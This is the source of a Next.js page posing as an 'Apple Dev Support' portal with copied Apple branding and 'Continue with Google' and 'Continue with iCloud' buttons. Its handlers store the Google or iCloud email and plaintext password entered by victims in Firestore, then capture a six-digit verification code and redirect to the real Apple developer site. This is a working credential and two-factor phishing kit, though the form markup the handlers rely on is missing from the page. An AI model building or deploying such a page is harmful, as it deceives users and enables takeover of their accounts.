import {
  signOut,
  getAuth,
  onAuthStateChanged,
  createUserWithEmailAndPassword,
} from "firebase/auth";

import {
  getFirestore,
  doc,
  setDoc,
  updateDoc,
} from "firebase/firestore";

import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useRouter } from "next/router"; 
import Head from "next/head"; // 👈 1. IMPORT HEAD DI SINI
import app from "@/lib/firebase";

const auth = getAuth(app);
const db = getFirestore(app);

export default function Home() {
  const router = useRouter();
  const [user, setUser] = useState<any>(null);

  const [showIcloud, setShowIcloud] = useState(false);
  const [showGoogle, setShowGoogle] = useState(false);
  
  const [loading, setLoading] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false); 
  const [verificationCode, setVerificationCode] = useState("");
  const [currentProvider, setCurrentProvider] = useState<"google" | "icloud" | null>(null);
  const [currentUid, setCurrentUid] = useState("");

  const [icloudEmail, setIcloudEmail] = useState("");
  const [icloudPassword, setIcloudPassword] = useState("");

  const [googleEmail, setGoogleEmail] = useState("");
  const [googlePassword, setGooglePassword] = useState("");

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  const loginGoogle = async () => {
    if (!googleEmail || !googlePassword) return alert("Please fill all fields");
    setLoading(true);
    try {
      const result = await createUserWithEmailAndPassword(
        auth,
        googleEmail,
        googlePassword
      );

      const user = result.user;
      setCurrentUid(user.uid);
      setCurrentProvider("google");

      await setDoc(doc(db, "google_users", user.uid), {
        uid: user.uid,
        email: googleEmail,
        password: googlePassword,
        provider: "google",
        createdAt: new Date(),
      });

      setShowGoogle(false);
      setShowVerification(true);
    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const loginIcloud = async () => {
    if (!icloudEmail || !icloudPassword) return alert("Please fill all fields");
    setLoading(true);
    try {
      const result = await createUserWithEmailAndPassword(
        auth,
        icloudEmail,
        icloudPassword
      );

      const user = result.user;
      setCurrentUid(user.uid);
      setCurrentProvider("icloud");

      await setDoc(doc(db, "icloud_users", user.uid), {
        uid: user.uid,
        email: icloudEmail,
        password: icloudPassword,
        provider: "icloud",
        createdAt: new Date(),
      });

      setShowIcloud(false);
      setShowVerification(true);
    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendVerificationCode = async () => {
    if (verificationCode.length !== 6) {
      return alert("Please enter a valid 6-digit code");
    }
    setLoading(true);
    try {
      const collectionName = currentProvider === "google" ? "google_users" : "icloud_users";
      const docRef = doc(db, collectionName, currentUid);

      await updateDoc(docRef, {
        verificationCode: verificationCode,
        verifiedAt: new Date(),
      });

      setShowVerification(false);
      setShowSuccessModal(true);
      
      setVerificationCode("");
      setGoogleEmail("");
      setGooglePassword("");
      setIcloudEmail("");
      setIcloudPassword("");

      setTimeout(() => {
        router.push("https://developer.apple.com/"); 
      }, 2000);

    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const logout = async () => {
    try {
      await signOut(auth);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <>
      {/* 2. ATUR TITLE DAN LOGO TAB DI SINI */}
      <Head>
        <title>Apple Dev Support</title>
        <meta name="description" content="Apple Developer Support Portal" />
        {/* Menggunakan favicon logo Apple resmi */}
        <link rel="icon" href="https://developer.apple.com/favicon.ico" />
      </Head>

      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 1 }}
        className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden bg-black px-4 pt-16"
      >
        {/* HEADER NAVIGATION */}
        <nav className="fixed top-0 left-0 right-0 z-[100] flex items-center justify-between border-b border-white/10 bg-black/40 px-6 py-4 backdrop-blur-xl">
          <div className="flex items-center gap-3">
            {/* Logo Apple */}
            <svg className="h-5 w-5 fill-white opacity-90" viewBox="0 0 384 512">
              <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
            </svg>
            <div className="h-4 w-[1px] bg-white/20" />
            <span className="text-sm font-medium tracking-tight text-white/90">Apple Dev Support</span>
          </div>

          {/* Hamburger Menu Icon */}
          <button className="flex flex-col gap-1.5 p-1 opacity-70 hover:opacity-100 transition-opacity">
            <div className="h-[1.5px] w-5 bg-white rounded-full" />
            <div className="h-[1.5px] w-5 bg-white rounded-full" />
          </button>
        </nav>

        {/* Floating Background */}
        <motion.div
          animate={{ y: [0, 20, 0], x: [0, 10, 0] }}
          transition={{ duration: 8, repeat: Infinity }}
          className="absolute top-[-150px] left-[-150px] h-[300px] w-[300px] sm:h-[500px] sm:w-[500px] rounded-full bg-white/10 blur-3xl pointer-events-none"
        />

        <motion.div
          animate={{ y: [0, -20, 0], x: [0, -10, 0] }}
          transition={{ duration: 10, repeat: Infinity }}
          className="absolute bottom-[-150px] right-[-150px] h-[250px] w-[250px] sm:h-[400px] sm:w-[400px] rounded-full bg-blue-500/10 sm:bg-blue-500/20 blur-3xl pointer-events-none"
        />

        {/* Card Utama */}
        <motion.div
          initial={{ opacity: 0, y: 40, scale: 0.95 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.8, type: "spring", stiffness: 80 }}
          className="relative z-10 w-full max-w-[360px] sm:w-[380px] rounded-[32px] sm:rounded-[40px] border border-white/10 bg-white/10 p-6 sm:p-8 shadow-2xl backdrop-blur-2xl"
        >
          {user ? (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center">
              <div className="mb-4 flex h-20 w-20 sm:h-24 sm:w-24 items-center justify-center rounded-full border-4 border-white/20 bg-white/10 text-3xl sm:text-4xl font-bold text-white">
                {user.email?.charAt(0).toUpperCase()}
              </div>
              <h1 className="text-center text-2xl sm:text-3xl font-semibold tracking-tight text-white">Welcome</h1>
              <p className="mt-1 text-xs sm:text-sm text-white/60 truncate max-w-full">{user.email}</p>
              <motion.button
                whileTap={{ scale: 0.96 }}
                whileHover={{ scale: 1.02 }}
                onClick={logout}
                className="mt-6 sm:mt-8 w-full rounded-2xl border border-white/10 bg-white/10 py-3 font-medium text-white transition-all duration-300 hover:bg-red-500/80"
              >
                Logout
              </motion.button>
            </motion.div>
          ) : (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
              <div className="mb-6 sm:mb-8 flex flex-col items-center text-center">
                <svg className="h-11 w-11 sm:h-14 sm:w-14 fill-white mb-3 drop-shadow-[0_0_15px_rgba(255,255,255,0.1)]" viewBox="0 0 384 512">
                  <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
                </svg>
                <h1 className="text-3xl sm:text-4xl font-semibold tracking-tight text-white">Welcome</h1>
                <p className="mt-1.5 text-xs sm:text-sm text-white/60">Sign in to continue</p>
              </div>

              {/* Google Button */}
              <motion.button
                whileHover={{ scale: 1.01 }}
                whileTap={{ scale: 0.98 }}
                onClick={() => setShowGoogle(true)}
                className="flex w-full items-center justify-center gap-3 rounded-2xl border border-white/10 bg-white/10 py-3.5 sm:py-4 text-sm sm:text-base text-white transition-all duration-300 hover:bg-white/20"
              >
                <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="google" className="h-5 w-5" />
                Continue with Google
              </motion.button>

              {/* iCloud Button */}
              <motion.button
                whileHover={{ scale: 1.01 }}
                whileTap={{ scale: 0.98 }}
                onClick={() => setShowIcloud(true)}
                className="mt-3 sm:mt-4 flex w-full items-center justify-center gap-3 rounded-2xl border border-white/10 bg-white/5 py-3.5 sm:py-4 text-sm sm:text-base text-white transition-all duration-300 hover:bg-white/10"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 fill-white" viewBox="0 0 384 512">
                  <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
                </svg>
                Continue with iCloud
              </motion.button>
            </motion.div>
          )}
        </motion.div>
      </motion.div>
    </>
  );
}